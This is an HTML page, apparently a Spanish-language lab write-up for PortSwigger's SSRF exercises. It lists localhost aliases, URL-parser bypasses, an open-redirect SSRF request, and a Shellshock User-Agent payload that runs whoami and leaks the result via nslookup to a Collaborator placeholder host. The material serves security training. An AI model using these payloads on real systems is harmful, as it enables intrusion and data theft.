@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="es" data-bs-theme="dark">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>SSRF | PortSwigger · cat4clysm</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" />
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css" rel="stylesheet" />
+  <link href="../style.css" rel="stylesheet" />
+  <link href="../writeups/writeup.css" rel="stylesheet" />
+</head>
+<body>
+  <nav class="navbar navbar-dark fixed-top" id="mainNav">
+    <div class="container">
+      <a class="navbar-brand fw-bold text-danger" href="../index.html">&gt;_ cat4clysm</a>
+      <a href="../portswigger.html" class="btn btn-sm btn-outline-secondary"><i class="bi bi-arrow-left"></i> PortSwigger</a>
+    </div>
+  </nav>
+
+  <main class="container py-5 mt-5">
+    <div class="writeup-header p-4 rounded mb-4">
+      <div class="d-flex flex-wrap gap-2 mb-3">
+        <span class="badge fs-6" style="background:#ff6633">PortSwigger</span>
+        <span class="badge bg-warning text-dark fs-6">SSRF</span>
+        <span class="badge bg-secondary">Blind</span>
+        <span class="badge bg-secondary">Filter Bypass</span>
+        <span class="badge bg-secondary">Shellshock</span>
+      </div>
+      <h1 class="text-white fw-bold mb-1">SSRF — Server-Side Request Forgery</h1>
+      <p class="text-secondary mb-0">Bypass de filtros de URL, redirecciones abiertas y explotación blind con Burp Collaborator.</p>
+    </div>
+
+    <!-- Localhost aliases -->
+    <section class="mb-5">
+      <h4 class="text-danger border-left-red mb-3"><i class="bi bi-hdd-network"></i> Otras formas de llamar al localhost</h4>
+      <div class="code-block">
+        <div class="code-header"><span class="text-warning">Equivalentes a 127.0.0.1</span></div>
+        <pre><code>127.0.0.1
+2130706433         # decimal
+017700000001       # octal
+127.1
+spoofed.burpcollaborator.net</code></pre>
+      </div>
+    </section>
+
+    <!-- URL parsing bypass -->
+    <section class="mb-5">
+      <h4 class="text-danger border-left-red mb-3"><i class="bi bi-link-45deg"></i> Bypass de URL parsing</h4>
+      <div class="code-block mb-3">
+        <div class="code-header"><span class="text-warning">Técnicas de bypass</span></div>
+        <pre><code># Credenciales antes del hostname con @
+https://expected-host:fakepassword@evil-host
+
+# Fragment # para confundir al parser
+https://evil-host#expected-host
+
+# Subdominio del host esperado bajo dominio controlado
+https://expected-host.evil-host</code></pre>
+      </div>
+      <div class="code-block">
+        <div class="code-header"><span class="text-warning">Double URL encoding bypass</span></div>
+        <pre><code>http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos</code></pre>
+      </div>
+    </section>
+
+    <!-- Open redirect -->
+    <section class="mb-5">
+      <h4 class="text-danger border-left-red mb-3"><i class="bi bi-arrow-right-circle"></i> Bypassing SSRF filters via open redirection</h4>
+      <p class="text-secondary">Si existe un open redirect en <code>/product/nextProduct?currentProductId=6&amp;path=http://evil-user.net</code>, se puede abusar para bypassear filtros SSRF:</p>
+      <div class="code-block">
+        <div class="code-header"><span class="text-success">POST /product/stock</span></div>
+        <pre><code>POST /product/stock HTTP/1.0
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 118
+
+stockApi=http://weliketoshop.net/product/nextProduct?currentProductId=6&path=http://192.168.0.68/admin</code></pre>
+      </div>
+    </section>
+
+    <!-- Blind OOB -->
+    <section class="mb-5">
+      <h4 class="text-danger border-left-red mb-3"><i class="bi bi-eye-slash"></i> Blind SSRF — Out-of-band detection</h4>
+      <div class="alert-custom border-left-info p-3 rounded mb-3">
+        <i class="bi bi-info-circle text-info me-2"></i>
+        <span class="text-secondary">Fijarse bien en el header <strong class="text-white">Referer</strong> — puede estar haciendo una consulta a un sitio externo.</span>
+      </div>
+      <img src="img/ssrf/01.png" class="img-fluid rounded border border-secondary mb-3" alt="Blind SSRF Referer header">
+    </section>
+
+    <!-- Shellshock -->
+    <section class="mb-5">
+      <h4 class="text-danger border-left-red mb-3"><i class="bi bi-terminal"></i> Blind SSRF — Shellshock exploitation</h4>
+      <div class="code-block mb-3">
+        <div class="code-header"><span class="text-warning">User-Agent payload</span></div>
+        <pre><code>() { :; }; /usr/bin/nslookup $(whoami).BURP-COLLABORATOR-SUBDOMAIN</code></pre>
+      </div>
+      <img src="img/ssrf/02.png" class="img-fluid rounded border border-secondary" alt="Blind SSRF Shellshock result">
+    </section>
+  </main>
+
+  <footer class="py-4 text-center border-top border-secondary">
+    <p class="text-secondary mb-0"><span class="text-danger">&gt;_</span> cat4clysm &copy; 2025 &nbsp;·&nbsp;<span class="text-muted">Hack the planet.</span></p>
+  </footer>
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+</body>
+</html>
